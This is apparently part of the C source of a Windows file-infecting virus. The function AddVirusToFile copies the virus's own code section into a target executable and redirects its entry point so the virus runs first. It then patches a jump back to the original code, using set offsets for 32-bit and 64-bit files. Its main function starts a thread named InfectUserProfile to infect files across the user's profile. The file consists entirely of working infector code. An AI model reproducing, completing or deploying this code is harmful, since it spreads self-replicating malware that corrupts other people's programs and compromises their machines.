#include "virus/virus.h"

int main();

void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, const PDATA data, LPDWORD new_file_size)
{
    PVOID section_data = NULL;
    DWORD section_size = 0;
    DWORD virus_section_va = 0;
    PIMAGE_SECTION_HEADER virus_section = GetCurrentVirusSection(data->this_file_base_address);
    DWORD virus_va_in_target;
    DWORD virus_ra_in_target;
    DWORD target_entry_point;

    target_entry_point = GetEntryPoint(file_data);

    virus_section_va = virus_section->VirtualAddress;
    section_size = virus_section->SizeOfRawData;
    section_data = data->iat->fnVirtualAlloc(
        NULL, 
        section_size, 
        MEM_COMMIT|MEM_RESERVE,
        PAGE_READWRITE
    );

    MemCopy(section_data, (PUCHAR)data->this_file_base_address + virus_section_va, section_size);

    PIMAGE_SECTION_HEADER virus_section_in_target = AddVirusSection(file_data, &file_size, section_data, section_size, data);

    virus_va_in_target = virus_section_in_target->VirtualAddress;
    virus_ra_in_target = virus_section_in_target->PointerToRawData;

    if (Is64BitExecutable(file_data))
    {
        DWORD entry_point_64bit = 0x28F0;
        SetEntryPoint(file_data, virus_va_in_target + entry_point_64bit);
        *(DWORD*)((unsigned char*)file_data + virus_ra_in_target + 0x2945) = target_entry_point - (virus_va_in_target + 0x2949) ;
    }
    else
    {
        DWORD entry_point_32bit = 0xca0;
        SetEntryPoint(file_data, virus_va_in_target + entry_point_32bit);
        *(DWORD*)((unsigned char*)file_data + virus_ra_in_target + 0xcdc) = target_entry_point - (virus_va_in_target + 0xce0);
    }

    data->iat->fnVirtualFree(
        section_data,
        0, 
        MEM_RELEASE
    );

    *(DWORD*)new_file_size = file_size + section_size;
    return;
}

void EmptyFunction()
{
    return;
}

int main()
{
    IAT iat;
    DATA data;
    data.iat = &iat;
    data.end_virus = 0;
    HANDLE handle_thread;
    GetFunctionAddresses(&data);    
    handle_thread = data.iat->fnCreateThread(NULL, 0, InfectUserProfile, (PVOID)(&data), 0, NULL);
    EmptyFunction();
    data.end_virus = 1;
    data.iat->fnWaitForSingleObject(handle_thread, INFINITE);
    return 0;
}
